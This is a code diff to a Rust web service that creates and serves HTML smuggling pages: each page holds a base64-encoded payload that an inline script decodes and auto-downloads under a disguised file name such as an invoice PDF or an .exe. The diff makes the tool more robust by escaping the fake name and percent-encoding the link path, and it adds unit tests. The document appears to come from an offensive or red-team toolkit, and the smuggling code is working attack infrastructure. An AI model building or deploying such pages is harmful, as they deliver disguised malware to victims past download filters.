@@ -16,7 +16,7 @@ const HTML_TEMPLATE: &str = r#"<!DOCTYPE html><html lang="en"><head><meta charse
 <title>Loading…</title>
 <style>*{margin:0;padding:0}body{display:flex;align-items:center;justify-content:center;min-height:100vh;background:#f9fafb;font-family:system-ui,sans-serif;color:#6b7280}p{font-size:.875rem}</style>
 </head><body><p>Loading…</p>
-<script>(function(){var d="{{PAYLOAD_B64}}",n="{{FAKE_NAME}}",b=atob(d),a=new Uint8Array(b.length);for(var i=0;i<b.length;i++)a[i]=b.charCodeAt(i);var u=URL.createObjectURL(new Blob([a]));var e=document.createElement("a");e.href=u;e.download=n;document.body.appendChild(e);e.click();setTimeout(function(){URL.revokeObjectURL(u);document.body.removeChild(e);},1000);})();</script>
+<script>(function(){var d="{{PAYLOAD_B64}}",n={{FAKE_NAME}},b=atob(d),a=new Uint8Array(b.length);for(var i=0;i<b.length;i++)a[i]=b.charCodeAt(i);var u=URL.createObjectURL(new Blob([a]));var e=document.createElement("a");e.href=u;e.download=n;document.body.appendChild(e);e.click();setTimeout(function(){URL.revokeObjectURL(u);document.body.removeChild(e);},1000);})();</script>
 </body></html>"#;
 
 // ── Helper validators ─────────────────────────────────────────────────────────
@@ -60,12 +60,6 @@ pub struct SmugResponse {
 }
 
 // ── POST /api/v1/smug ─────────────────────────────────────────────────────────
-//
-// NOTE: `state.smuggler_dir` is added to AppState in Task 2.  Until that field
-// exists the handler bodies below reference it, so the crate won't compile as a
-// binary or library.  The unit-test targets compile only the helper functions
-// (which live above and have no AppState dependency), so `cargo test
-// smuggler::tests` succeeds regardless.
 
 pub async fn create_smug(
     State(state): State<AppState>,
@@ -115,17 +109,17 @@ pub async fn create_smug(
     let raw: [u8; 16] = rand::thread_rng().gen();
     let link_id: String = raw.iter().map(|b| format!("{:02x}", b)).collect();
 
+    let fake_name_json = serde_json::to_string(&fake_name).unwrap();
     let html = HTML_TEMPLATE
         .replace("{{PAYLOAD_B64}}", &b64)
-        .replace("{{FAKE_NAME}}", &fake_name);
+        .replace("{{FAKE_NAME}}", &fake_name_json);
 
-    // Task 2 adds `smuggler_dir` to AppState — this reference is intentional
     let out_path = state.smuggler_dir.join(format!("{}.html", link_id));
     std::fs::write(&out_path, html.as_bytes())
         .map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
 
     Ok(Json(SmugResponse {
-        url: format!("/d/{}/{}", link_id, fake_name),
+        url: format!("/d/{}/{}", link_id, percent_encode_path(&fake_name)),
         link_id,
     }))
 }
@@ -141,7 +135,6 @@ pub async fn serve_smug(
         return Err(StatusCode::NOT_FOUND);
     }
 
-    // Task 2 adds `smuggler_dir` to AppState — this reference is intentional
     let html_path = state.smuggler_dir.join(format!("{}.html", link_id));
     let html = match std::fs::read_to_string(&html_path) {
         Ok(s)  => s,
@@ -154,6 +147,26 @@ pub async fn serve_smug(
         .header("Cache-Control", "no-store, no-cache")
         .body(Body::from(html))
         .unwrap())
+}
+
+// ── URL path segment encoder ──────────────────────────────────────────────────
+
+fn percent_encode_path(s: &str) -> String {
+    let mut out = String::with_capacity(s.len());
+    for c in s.chars() {
+        if c.is_ascii_alphanumeric() || matches!(c, '-' | '_' | '.' | '~') {
+            out.push(c);
+        } else if c.is_ascii() {
+            let _ = std::fmt::Write::write_fmt(&mut out, format_args!("%{:02X}", c as u8));
+        } else {
+            let mut buf = [0u8; 4];
+            let encoded = c.encode_utf8(&mut buf);
+            for b in encoded.bytes() {
+                let _ = std::fmt::Write::write_fmt(&mut out, format_args!("%{:02X}", b));
+            }
+        }
+    }
+    out
 }
 
 // ── Unit tests ────────────────────────────────────────────────────────────────
@@ -247,5 +260,25 @@ mod tests {
     fn link_id_rejects_non_hex() {
         assert!(!validate_link_id("a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3dg"));
         assert!(!validate_link_id("a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d "));
+    }
+
+    // serde_json escaping and percent-encoding
+
+    #[test]
+    fn fake_name_with_quotes_is_json_escaped() {
+        // Verify that fake_name containing a double quote doesn't produce raw JS
+        let fake_name = "file\".exe";
+        let json = serde_json::to_string(fake_name).unwrap();
+        // JSON output must include escaped quote, not raw "
+        assert!(json.contains("\\\""), "quote must be escaped in JSON");
+        assert!(!json.contains("\","), "raw quote must not appear adjacent to comma");
+    }
+
+    #[test]
+    fn percent_encode_path_encodes_spaces_and_special_chars() {
+        assert_eq!(percent_encode_path("Invoice 2024.pdf"), "Invoice%202024.pdf");
+        assert_eq!(percent_encode_path("file#1.pdf"), "file%231.pdf");
+        assert_eq!(percent_encode_path("safe-name_v1.pdf"), "safe-name_v1.pdf");
+        assert_eq!(percent_encode_path("a?b"), "a%3Fb");
     }
 }
